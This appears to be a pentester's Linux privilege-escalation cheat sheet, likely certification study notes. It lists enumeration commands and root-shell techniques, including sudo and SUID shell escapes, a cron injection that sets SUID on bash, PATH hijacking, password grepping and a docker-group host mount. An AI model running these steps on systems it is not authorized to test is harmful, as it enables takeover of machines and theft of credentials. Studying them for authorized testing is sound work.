# Linux Local Enumeration & Privilege Escalation



# 1. Initial Context

```
id
whoami
hostname
uname -a
cat /etc/issue
```

Check:
- User privileges
- OS version
- Kernel version

# 2. Sudo Privileges (Most Important First)

```
sudo -l
```

If allowed:

```
sudo <allowed_command>
```

Check GTFOBins for command abuse.

Example:

```
sudo vim -c ':!sh'
sudo find . -exec /bin/sh \; -quit
```

# 3. SUID / SGID Binaries

```
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

Look for unusual binaries.

Test common escapes:

```
find . -exec /bin/sh \; -quit
```

Check:
https://gtfobins.github.io/

# 4. Writable Files & Directories

```
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
```

Look for:
- /etc files
- service configs
- scripts run by root

# 5. Cron Jobs

```
cat /etc/crontab
ls -la /etc/cron*
```

If writable script executed by root:
Inject:

```
/bin/bash -c 'chmod +s /bin/bash'
```

# 6. PATH Hijacking

Check PATH:

```
echo $PATH
```

If writable directory in PATH:

Create malicious file named after called binary.


# 7. Running Services

```
ps aux
```

Look for:
- Services running as root
- Custom scripts

Check service config:

```
cat /etc/systemd/system/*.service
```

# 8. Credentials in Files

Search for:

```
grep -Ri "password" /home 2>/dev/null
grep -Ri "password" /var/www 2>/dev/null
```

Check:
- .bash_history
- config.php
- database.yml
- backup files

# 9. SSH Keys

```
ls -la ~/.ssh
```

Check other users if accessible.



# 10. Capabilities

```
getcap -r / 2>/dev/null
```

If binary has cap_setuid:

Exploit similar to SUID.



# 11. Docker / LXC

Check:

```
groups
```

If user in docker group:

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```



# 12. NFS Misconfig

Check mounts:

```
mount
cat /etc/exports
```

If no_root_squash:
Create SUID binary.



# 13. Kernel Exploit (Last Resort)

Check version:

```
uname -r
```

Search exploit manually.

CRT usually avoids heavy kernel exploitation.



# 14. Panic Mode Quick Checklist

```
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ps aux
getcap -r / 2>/dev/null
groups
grep -Ri password /home 2>/dev/null
```
